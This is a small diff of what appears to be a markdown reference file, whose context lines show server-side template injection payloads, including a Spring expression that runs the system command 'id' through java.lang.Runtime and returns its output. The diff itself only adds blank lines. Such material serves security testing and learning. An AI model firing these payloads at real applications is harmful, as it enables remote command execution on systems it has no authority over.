@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:23:33.381863+00:00'
 *{7*7}
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
+
+
